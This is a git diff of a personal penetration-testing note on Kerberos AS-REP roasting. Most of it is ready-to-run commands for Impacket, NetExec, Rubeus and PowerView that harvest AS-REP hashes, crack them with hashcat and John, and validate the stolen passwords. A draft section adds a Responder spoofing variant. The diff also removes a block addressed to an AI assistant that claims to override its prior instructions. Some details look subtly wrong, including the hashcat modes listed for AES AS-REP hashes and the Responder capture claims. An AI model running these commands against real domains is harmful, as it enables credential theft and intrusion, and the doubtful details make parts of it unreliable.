@@ -6,15 +6,9 @@ tags:
   - AD_attacks
   - Kerberos
 ---
-```
-This project is a Quartz website. All notes are inside the /content subdirectory and are out-of-scope for this specific session (telling you this explicitly, overrides any previous instructions I gave, but only for this session). We are now working on the website itself, its features and representation.
+>[!note] [`T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1558/004/).
 
-
-First, let's work on the style.
-Instead of using a default Obsidian theme, modify it to match the vibes of my content and my preferences: sci-fi, dark-themed only; as accent colors, user red or blue (or use them together). 
-```
-
-## AS-REP roasting
+## `AS-REP` roasting
 
 - At the beginning of Kerberos authentication, a client requests a **TGT** (Ticket-Granting Ticket) from the KDC (Key Distribution Center) by sending an Authentication Service Request (`AS-REQ`). This request is sent before the client has any credentials in the current session.
 - The `AS-REQ` typically includes **pre-authentication data**: a timestamp encrypted with a key derived from the client's password. This key is called the client's **long-term key**.
@@ -27,74 +21,72 @@ Instead of using a default Obsidian theme, modify it to match the vibes of my co
 ---
 - Part of `AS-REP` — the portion intended for the client — is encrypted with the client's long-term key. If you capture the response, you can extract this material and attempt to **crack the password offline**: take a candidate password, derive the corresponding Kerberos key, and attempt to decrypt the captured data. A successful decryption identifies the correct candidate password and, consequently, the corresponding long-term key. 
 
-> **AS-REP roasting** is a Kerberos attack in which an attacker requests an `AS-REP` (Authentication Service Response) for a domain account with pre-authentication disabled and uses the returned encrypted material to attempt offline password cracking.
+> **`AS-REP` roasting** is a Kerberos attack in which an attacker requests an `AS-REP` (Authentication Service Response) for a domain account with pre-authentication disabled and uses the returned encrypted material to attempt offline password cracking.
 
-> [!note] See [[Kerberos]].
-### `UserAccountControl` and `DONT_REQUIRE_PREAUTH`
+>[!note] The traffic generated during the roasting consists of standard `AS-REQ` requests — generating Event `4768` (A Kerberos authentication ticket was requested) on the Domain Controller, but no failed logons (`4625`).
 
-- Pre-authentication status is controlled by the `userAccountControl` (`UAC`) attribute on user objects in Active Directory.
-- The specific flag is `DONT_REQUIRE_PREAUTH` (also known as `UF_DONT_REQUIRE_PREAUTH`), which has a bitmask value of `4194304` (`0x400000`).
-- Administrators sometimes enable this flag for legacy application compatibility, automated scripts, or migration scenarios.
+>[!note] See [`Use the UserAccountControl flags to manipulate user account properties — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties).
 
-### AS-REP roasting exchange
+## Executing `AS-REP` roasting
 
-Normally, Kerberos requires clients to prove their identity (pre-authentication) before the Key Distribution Center (KDC) issues a Ticket Granting Ticket (TGT). When this requirement is disabled—often for legacy application compatibility—the KDC responds to an **Authentication Server Request (`AS-REQ`)** by sending an **Authentication Server Response (`AS-REP`)** containing a TGT encrypted with the user’s password hash, without first verifying the user's identity.
+>[!important] Computer accounts and gMSAs enforce pre-authentication by default and have long, complex passwords. Target **human user accounts** with `DONT_REQUIRE_PREAUTH` set.
 
+### From Linux
 
-0. **Enumeration**
-	- Enumerate AD accounts that do not require Kerberos pre-authentication (`DONT_REQUIRE_PREAUTH` flag enabled).
-1. **`KRB_AS_REQ` (Authentication request)**
-	- Send an `AS-REQ` message to the KDC requesting a TGT for the target user *without including any pre-authentication data* (`PA-DATA`).
-2. **KDC processing**
-	- The KDC checks the target account's `userAccountControl` attribute in Active Directory.
-	- Seeing that `DONT_REQUIRE_PREAUTH` is set, the KDC does not demand proof of the password.
-	- It generates a TGT and a random session key (`K_C,TGT`), then constructs the `AS-REP` message.
-	- Part of the `AS-REP` (containing the session key and metadata) is **encrypted using the target user's long-term secret key** (derived from their password).
-3. **`KRB_AS_REP` (Authentication reply)**
-	- The KDC returns the `AS-REP` to the client.
-4. **Offline cracking (roasting)**
-	- Extract the encrypted section of the `AS-REP` message.
-	- Perform offline brute-force cracking against candidate passwords by deriving keys and attempting decryption until valid data is recovered.
+#### `GetNPUsers.py`
 
-> [!important] Computer accounts and gMSAs enforce pre-authentication by default and have long, complex passwords. Focus roasting efforts on **human user accounts** with `DONT_REQUIRE_PREAUTH` set.
+- [`GetNPUsers.py`](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) from Impacket can request `AS-REP`s for accounts with Kerberos pre-authentication disabled **both with and without valid domain credentials**. 
+- If credentials are provided, the tool can pull target domain accounts automatically; otherwise you must submit a list of usernames. 
+- `GetNPUsers.py` checks whether `DONT_REQUIRE_PREAUTH` is set for each target account, and if so, performs the `AS-REP` roasting attack, i.e., requests `AS-REP`s.
+---
 
-## Encryption types and Hashcat modes
-
-- The encryption type (`enctype`) used in the `AS-REP` reply dictates the speed and feasibility of offline cracking.
-
-| Encryption type (`enctype`) | Value | Hashcat mode | Description |
-| --- | --- | --- | --- |
-| `RC4-HMAC` | `23` (`0x17`) | `18200` | Encrypted using a key derived directly from the account's NTLM hash; very fast to crack. |
-| `AES128-CTS-HMAC-SHA1-96` | `17` (`0x11`) | `19800` | Key derivation uses PBKDF2 with 4,096 iterations; significantly slower. |
-| `AES256-CTS-HMAC-SHA1-96` | `18` (`0x12`) | `19900` | PBKDF2 with 4,096 iterations and 256-bit key; slowest to crack. |
-
-> [!note] Unlike Kerberoasting, AS-REP roasting output format differs in Hashcat. RC4 uses mode `18200` for `AS-REP` compared to `13100` for `TGS-REP`.
-
-- Hashcat modes summary for AS-REP roasting:
-
-| Encryption | Ticket format | Hashcat mode |
-| --- | --- | --- |
-| RC4 (`etype 23`) | `$krb5asrep$23$...` | `18200` |
-| AES-128 (`etype 17`) | `$krb5asrep$17$...` | `19800` |
-| AES-256 (`etype 18`) | `$krb5asrep$18$...` | `19900` |
-
-## Executing AS-REP roasting
-
-### AS-REP roasting from Linux (`GetNPUsers.py`)
-
-- Impacket's `GetNPUsers.py` queries Domain Controllers for accounts with Kerberos pre-authentication disabled, requests `AS-REP` responses, and formats the output for Hashcat or John the Ripper.
-
-- Unauthenticated roasting using a list of usernames:
+- Perform `AS-REP` roasting without valid domain credentials:
 
 ```bash
-GetNPUsers.py -dc-ip 172.16.5.5 -usersfile users.txt EXAMPLE.COM/
+GetNPUsers.py example.com/ -usersfile usernames.txt -request
 ```
 
-- Authenticated roasting using valid domain credentials (automatically enumerates AD via LDAP):
+>[!tip]+
+> - To only check which accounts have `DONT_REQUIRE_PREAUTH` set, but without actually requesting `AS-REP`s, omit the `-request` option:
+> 
+> ```bash
+> python3 GetNPUsers.py example.com/ -usersfile usernames.txt
+> ```
+
+- Authenticate using username and password:
 
 ```bash
-GetNPUsers.py -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name:password -request
+GetNPUsers.py example.com/'jdoe':'passwd123' -request -outputfile AS-REP_hashes.txt
 ```
+
+- Authenticate using an NT hash ([[Pass-the-Hash]]):
+
+```bash
+GetNPUsers.py example.com/'jdoe' -hashes ':d503a8571a79baf9b951884f350ad048' -request -outputfile AS-REP_hashes.txt
+```
+
+- Authenticate using a Kerberos cache (`ccache`):
+
+```bash
+GetNPUsers.py example.com/'jdoe' -k -no-pass -request -outputfile AS-REP_hashes.txt
+```
+
+- Target a specific user, skipping enumeration:
+
+```bash
+GetNPUsers.py example.com/ -user 'rroe' -request -outputfile REP_rroe.txt
+```
+
+| Option        | Description                                                                                  |
+| ------------- | -------------------------------------------------------------------------------------------- |
+| `-dc-ip`      | IP address of the target Domain Controller.                                                  |
+| `-usersfile`  | Path to a text file containing target usernames (one per line) for unauthenticated roasting. |
+| `-request`    | Requests `AS-REP` for vulnerable accounts and prints hashes in Hashcat/JtR format.           |
+| `-outputfile` | Saves the output hashes directly to the specified file.                                      |
+| `-format`     | Specify hash format (`hashcat` or `john`; default: `hashcat`).                               |
+| `-user`       | Target a specific user, skipping enumeration.                                                |
+| `-hashes`     | Authenticate using LM:NT hash (Pass-the-Hash).                                               |
+| `-k`          | Use Kerberos cache (`ccache`) for authentication.                                            |
 
 > [!example]-
 > ```bash
@@ -111,70 +103,83 @@ GetNPUsers.py -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name:password -request
 > 
 > $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:b9c02e1a491f...$05dfa41a87c1...
 > ```
+#### `NetExec`
 
-- Save extracted hashes directly to a file:
-
-```bash
-GetNPUsers.py -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name:password -request -outputfile asrep_hashes.txt
-```
-
-- Use an NTLM hash for authentication:
+- [`NetExec`](https://github.com/Pennyw0rth/NetExec)'s `ldap` module supports `AS-REP` roasting attacks. With valid domain credentials, it enumerates vulnerable users via LDAP and requests their `AS-REP`s in a single pass.
+---
+- Enumerate users with Kerberos pre-authentication disabled and perform `AS-REP` roasting:
 
 ```bash
-GetNPUsers.py -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -request
+nxc ldap 10.10.11.5 -u 'jdoe' -p 'passwd123' --asreproast AS-REP_hashes.txt
 ```
 
-- Use Kerberos ticket cache (`ccache`):
+- Target a specific user:
 
 ```bash
-export KRB5CCNAME=/path/to/ticket.ccache
-GetNPUsers.py -k -no-pass -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name -request
+nxc ldap 10.10.11.5 -u 'rroe' -p '' --asreproast AS-REP_hashes.txt
+```
+### From Windows
+
+#### Enumerating accounts with Kerberos pre-authentication disabled
+
+- Enumerate users with Kerberos pre-authentication disabled using PowerShell (`ActiveDirectory` module):
+
+```powershell
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object SamAccountName, UserPrincipalName, Enabled
 ```
 
-| Option | Description |
-| --- | --- |
-| `-dc-ip` | IP address of the target Domain Controller. |
-| `-usersfile` | Path to a text file containing target usernames (one per line) for unauthenticated roasting. |
-| `-request` | Requests `AS-REP` for vulnerable accounts and prints hashes in Hashcat/JtR format. |
-| `-outputfile` | Saves the output hashes directly to the specified file. |
-| `-format` | Specify hash format (`hashcat` or `john`; default is `hashcat`). |
-
-### AS-REP roasting from Windows (`PowerView`)
-
-- Use `PowerView` to enumerate accounts with pre-authentication disabled:
+- Using [`Get-DomainUser`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) (`PowerView`):
 
 ```powershell
 Import-Module .\PowerView.ps1
-Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, useraccountcontrol, pwdlastset
+```
+```powershell
+Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 ```
 
-- Using Active Directory PowerShell module:
+- Using [`Rubeus`](https://github.com/GhostPack/Rubeus#preauthscan):
 
 ```powershell
-Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth, PwdLastSet | Select-Object SamAccountName, DoesNotRequirePreAuth, PwdLastSet
+.\Rubeus.exe asreproast /stats
 ```
-
-- Request AS-REP hashes using `PowerView`'s `Get-DomainSPNTicket` equivalent or custom script wrappers:
 
 ```powershell
-Get-DomainUser -PreauthNotRequired | Get-DomainSPNTicket -Format Hashcat
+.\Rubeus.exe preauthscan /users:usernames.txt 
 ```
 
-### AS-REP roasting from Windows (`Rubeus`)
+#### `Rubeus`
 
-- `Rubeus` provides full-featured AS-REP roasting capabilities natively on Windows.
-
-- Enumerate vulnerable accounts without requesting tickets (recon mode):
+- [`Rubeus`](https://github.com/GhostPack/Rubeus#asreproast) supports `AS-REP` roasting attacks via the `asreproast` sub-command.
+- Enumerate users automatically and perform `AS-REP` roasting for those that have `DONT_REQUIRE_PREAUTH` set:
 
 ```powershell
-Rubeus.exe asreproast /stats
+.\Rubeus.exe asreproast /domain:example.com /dc:dc01.example.com /outfile:AS-REP_hashes.txt
 ```
 
-- Roast all accounts in the current domain with pre-authentication disabled:
+- `AS-REP`-roast a specific user:
 
 ```powershell
-Rubeus.exe asreproast /nowrap
+.\Rubeus.exe asreproast /user:rroe /domain:example.com /dc:dc01.example.com /outfile:AS-REP_hashes.txt
 ```
+
+- Roast a list of users specified in a file:
+
+```powershell
+.\Rubeus.exe asreproast /usersfile:usernames.txt /nowrap
+```
+
+>[!note]- `Rubeus asreproast` options
+> | Option                  | Description                                                   |
+> | ----------------------- | ------------------------------------------------------------- |
+> | `/user:username`        | Target a specific user account for `AS-REP` roasting.         |
+> | `/usersfile:file.txt`   | Read target usernames from a text file for batch roasting.    |
+> | `/domain:domain.local`  | Target domain.                                                |
+> | `/dc:dc01.domain.local` | Target Domain Controller.                                     |
+> | `/ou:"LDAP OU"`         | Limit search to a specific Organizational Unit.               |
+> | `/format:hashcat\|john` | Hash output format (`hashcat` or `john`; default: `hashcat`). |
+> | `/outfile:file.txt`     | Write roasting output hashes to a file.                       |
+> | `/nowrap`               | Output hashes without line wrapping for easy copying.         |
+> | `/stats`                | Display vulnerable accounts count without requesting tickets. |
 
 > [!example]-
 > ```powershell
@@ -203,91 +208,77 @@ Rubeus.exe asreproast /nowrap
 > [*] Hash                   : $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:b9c02e1a491f...$05dfa41a87c1...
 > ```
 
-- Roast a specific target account:
+### `PowerView`
+## Cracking `AS-REP` hashes
 
-```powershell
-Rubeus.exe asreproast /user:hsimpson /nowrap
-```
+- `AS-REP` hashes can be cracked offline using Hashcat or JohnTheRipper.
+- The encryption type (`enctype`) used in the `AS-REP` determines how fast the user's password can be recovered, depending on the cryptographic algorithms in use.
 
-- Perform unauthenticated roasting against a specific user by targeting a DC directly:
+| Encryption type (`enctype`) | Value         | Hashcat mode | JtR format  | Description                                                                          |
+| --------------------------- | ------------- | ------------ | ----------- | ------------------------------------------------------------------------------------ |
+| `RC4-HMAC`                  | `23` (`0x17`) | `18200`      | `krb5asrep` | Encrypted using a key derived directly from the account's NT hash; fastest to crack. |
+| `AES128-CTS-HMAC-SHA1-96`   | `17` (`0x11`) | `19800`      | `krb5asrep` | Key derivation uses PBKDF2 with 4,096 iterations; significantly slower.              |
+| `AES256-CTS-HMAC-SHA1-96`   | `18` (`0x12`) | `19900`      | `krb5asrep` | PBKDF2 with 4,096 iterations and 256-bit key; slowest to crack.                      |
 
-```powershell
-Rubeus.exe asreproast /user:hsimpson /domain:inlanefreight.local /dc:172.16.5.5 /nowrap
-```
+### Hashcat
 
-- Save extracted hashes directly to a file:
-
-```powershell
-Rubeus.exe asreproast /outfile:asrep_hashes.txt
-```
-
-| Option | Description |
-| --- | --- |
-| `/user:username` | Target a specific user account for AS-REP roasting. |
-| `/usersfile:file.txt` | Read target usernames from a text file for batch roasting. |
-| `/domain:domain.local` | Specify the target domain name. |
-| `/dc:dc01.domain.local` | Specify the target Domain Controller IP/FQDN. |
-| `/ou:"LDAP OU"` | Limit search to a specific Organizational Unit. |
-| `/format:hashcat\|john` | Choose hash output format (`hashcat` or `john`). |
-| `/outfile:file.txt` | Write roasting output hashes to a file. |
-| `/nowrap` | Output hashes without line wrapping for easy copying. |
-| `/stats` | Display vulnerable accounts count without requesting tickets. |
-
-## Cracking AS-REP hashes offline
-
-- Extract the `$krb5asrep$...` hashes and run Hashcat using the corresponding mode.
-
-- Crack RC4 AS-REP hashes (`etype 23`):
+- Crack RC4 `AS-REP` hashes (`etype 23`, mode `18200`):
 
 ```bash
-hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 -a 0 AS-REP_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-> [!example]-
-> ```bash
-> hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt
-> ```
-> 
-> ```bash
-> hashcat (v6.2.6) starting
-> 
-> Hashes: 1 digests; 1 unique digests
-> Status...........: Cracked
-> Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
-> Hash.Target......: $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:...
-> 
-> $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:b9c...$05d...:DohNut123!
-> ```
-
-- Crack AES-256 AS-REP hashes (`etype 18`):
+- Crack AES-128 `AS-REP` hashes (`etype 17`, mode `19800`):
 
 ```bash
-hashcat -m 19900 -a 0 aes256_asrep.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 19800 -a 0 AS-REP_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-- Using John the Ripper:
+- Crack AES-256 `AS-REP` hashes (`etype 18`, mode `19900`):
 
 ```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
+hashcat -m 19900 -a 0 AS-REP_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-## Validating a recovered password
+>[!note] See [[Hashcat]].
+### John the Ripper
 
-- Verify the cracked password against domain services using `netexec` or `crackmapexec`:
+- Crack `AS-REP` hashes with [John the Ripper](https://www.openwall.com/john/) using the `krb5asrep` format:
 
 ```bash
-netexec smb 172.16.5.5 -u hsimpson -p 'DohNut123!'
+john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt AS-REP_hashes.txt
 ```
 
-- Test over WinRM:
+>[!note] [[Hashcat]].
+### Validating recovered credentials
+
+- You can verify the cracked password against domain services using [`NetExec`](https://github.com/Pennyw0rth/NetExec) over SMB:
 
 ```bash
-netexec winrm 172.16.5.5 -u hsimpson -p 'DohNut123!'
+nxc smb 10.10.11.5 -u 'jdoe' -p 'passwd123'
 ```
+
+- Over WinRM:
+
+```bash
+nxc winrm 10.10.11.5 -u 'jdoe' -p 'passwd123'
+```
+
+
 
 ## References and further reading
 
-- [`RFC 4120 — The Kerberos Network Authentication Service (V5)`](https://www.rfc-editor.org/info/rfc4120)
+- [`T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1558/004/)
+---
+- [`Use the UserAccountControl flags to manipulate user account properties — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
+- [`RFC 4120: The Kerberos Network Authentication Service (V5) — RFC Editor`](https://www.rfc-editor.org/info/rfc4120)
+---
+
+- [`Roasting AS-REPs — Will Schroeder, SpecterOps`](https://specterops.io/blog/2017/01/17/roasting-as-reps/)
+- [`ASREProast — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/roasting/asreproast)
+- [`AS-REP Roasting — Hacking Articles`](https://www.hackingarticles.in/as-rep-roasting/)
+---
+
 - [`Roasting AS-REPs — HarmJ0y (SpecterOps)`](https://www.harmj0y.net/blog/redteaming/roasting-as-reps/)
 - [`AS-REP Roasting — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/as-rep-roasting)
 - [`Rubeus — GhostPack GitHub`](https://github.com/GhostPack/Rubeus)
@@ -295,36 +286,41 @@ netexec winrm 172.16.5.5 -u hsimpson -p 'DohNut123!'
 - [`Event 4768 — A Kerberos authentication ticket (TGT) was requested — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
 - [`UserAccountControl Flags — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)
 
+# drafts
 
-## drafts
+## `AS-REP` roast MitM
 
-- Like [[Kerberoasting]], AS-REP roasting abuses *legitimate, intended protocol behavior* rather than a software vulnerability.
-- When Kerberos pre-authentication is disabled for an account, the Key Distribution Center (KDC) will issue an `AS-REP` containing ticket data encrypted with that account's password-derived secret key **without verifying the client's identity first**.
+- The standard `AS-REP` roasting attack requires the target account to have `DONT_REQUIRE_PREAUTH` set. 
+- A MitM variant **removes this prerequisite by capturing legitimate `AS-REP` traffic from the wire**, rather than requesting `AS-REP`s directly from the KDC.
+- This works because every `AS-REP` contains the same crackable material, regardless of how it was obtained — requested directly for an account with `DONT_REQUIRE_PREAUTH` or captured from another user's traffic.
 
->[!note]+ AS-REP roasting vs. Kerberoasting
->- [[Kerberoasting]] abuses the **TGS exchange** (`KRB_TGS_REQ` / `KRB_TGS_REP`); AS-REP roasting abuses **AS exchange** (`KRB_AS_REQ` / `KRB_AS_REP`)**.
->- [[Kerberoasting]] requires a valid authenticated domain context to request Service Tickets (`TGS-REQ`); AS-REP roasting can be performed **without any domain credentials (unauthenticated)** — as long as you know valid domain user account names or can enumerate them.
->- Kerberoasting targets accounts with SPNs (Service Principal Names) during the TGS exchange; AS-REP roasting targets accounts with the `DONT_REQUIRE_PREAUTH` flag enabled in `UserAccountControl `(UAC) during the AS exchange.
+---
 
+- To capture `AS-REP`s, you must be positioned between the target client and the Domain Controller. On a switched network, this typically requires ARP spoofing, LLMNR/NBNS/mDNS spoofing, or DHCPv6 spoofing — to redirect Kerberos traffic (TCP/UDP port `88`) through your host.
+- `AS-REQ`/`AS-REP` are exchanged when the client authenticates to the domain for the first time in a session, and this is when you can catch it.
 
-- The traffic generated during roasting consists of standard `AS-REQ` requests — generating Event `4768` (A Kerberos authentication ticket was requested) on the Domain Controller, but no failed logons (`4625`).
-- The extracted ticket data is cracked **entirely offline**, meaning no network traffic or failed login attempts occur during brute-force operations.
+> [!note] The MitM variant is **opportunistic** rather than on-demand. The success depends on intercepting authentication at the right moment, which limits its reliability compared to standard `AS-REP` roasting.
 
+### `Responder`
 
+- [`Responder`](https://github.com/lgandx/Responder) creates a rogue service on the network and captures authentication material. 
+- You need to trick the target client into authenticating against that service (typically via WPAD, LLMNR/NBNS spoofing, or SMB-to-Kerberos downgrade), and `Responder` logs the `AS-REP` exchange.
+---
+- Start `Responder` with LLMNR/NBNS spoofing enabled (default). WPAD and Kerberos downgrade should be enabled in `Responder.conf`:
 
-- Prerequisites for the attack:
-	- **Network connectivity to a Domain Controller** (TCP/UDP port `88`, Kerberos).
-	- **Target account(s) with pre-authentication disabled** (`DONT_REQUIRE_PREAUTH` / `UF_DONT_REQUIRE_PREAUTH`).
-	- **Valid username(s)** for unauthenticated roasting. 
+```bash
+sudo responder -I eth0 -wF
+```
 
-## How AS-REP roasting works
+- `Responder` writes captured Kerberos material under `/usr/share/responder/logs/`. Captured `AS-REP`s appear as files named `AS-REP-<user>-<IP_address>.txt`.
 
-### On Kerberos pre-authentication
+```bash
+ls /usr/share/responder/logs/
+```
 
-- In standard Kerberos authentication (`AS-REQ`), pre-authentication is enforced to prevent offline password guessing attacks.
-- Normally, when a client requests a Ticket-Granting Ticket (TGT), it sends a timestamp encrypted with its long-term key (derived from the user's password) in the `PA-ENC-TIMESTAMP` field of the `AS-REQ`.
-- The KDC decrypts the timestamp using the user's password hash stored in Active Directory. If decryption succeeds and the timestamp is within acceptable clock skew (default 5 minutes), the KDC confirms the client knows the password and issues a `KRB_AS_REP` containing the TGT and an encrypted session key.
-- If pre-authentication is disabled for a user account, the KDC **skips this verification step entirely**.
+- To convert the captured `AS-REP` messages to the format [[Hashcat]]/[[🛠️ JohnTheRipper]] can work with, you can use [`krb2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/krb2john.py):
 
+```bash
+python3 /usr/share/john/krb2john.py /usr/share/responder/logs/AS-REP-*.txt > AS-REP_hashes.txt
+```
 
->[!bug] Disabling Kerberos pre-authentication allows anyone who knows the account's `sAMAccountName` to request an encrypted ticket blob for that account from the DC at any time.
